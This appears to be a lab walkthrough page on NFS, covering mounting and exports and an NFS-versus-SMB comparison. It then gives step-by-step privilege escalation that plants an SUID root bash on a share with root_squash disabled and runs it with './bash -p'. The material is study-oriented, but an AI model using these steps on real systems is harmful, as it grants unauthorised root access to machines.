# NFS/2049

**Mounting NFS shares**

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create\
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

```bash
sudo mkdir /tmp/mount
```

```bash
sudo mount -t nfs IPaddress:sharename /tmp/mount/ -nolock
```

**Checking NFS exports**

```bash
sudo showmount -e ipaddres
```



| Feature               | NFS                                                                         | SMB                                                                |
| --------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| Transport             | Typically **TCP/UDP**, uses **port 2049**                                   | Typically **TCP**, uses **ports 445 and 139**                      |
| Stateless vs Stateful | NFS v3: **stateless** (server doesn’t track client state), v4: **stateful** | Always **stateful** (maintains session info)                       |
| Performance           | Often faster in Unix/Linux environments due to lower overhead               | Can be slower over high-latency networks, but optimized in Windows |
| Caching               | NFS allows client-side caching                                              | SMB also supports caching, but it is more complex                  |

## Exploiting

```
    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS
                            
```

**What is root\_squash?**

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

**The Executable**

1\) Due to compatibility reasons,  we will obtain the bash executable directly from the target machine.\
With the key obtained in the previous task, we can use SCP with the command `scp -i key_name username@10.10.242.108:/bin/bash ~/Downloads/bash` to download it onto our attacking machine.

Another method to overcome compatibility issues is to obtain a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it [here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`.&#x20;

2\) Download the bash executable to your Downloads directory. Then use "cp \~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

3\) Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using `sudo chmod +s bashfile`. What letter do we use to set the SUID bit set using chmod?

4\) let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

5\) Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with _`./bash -p`_. The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions
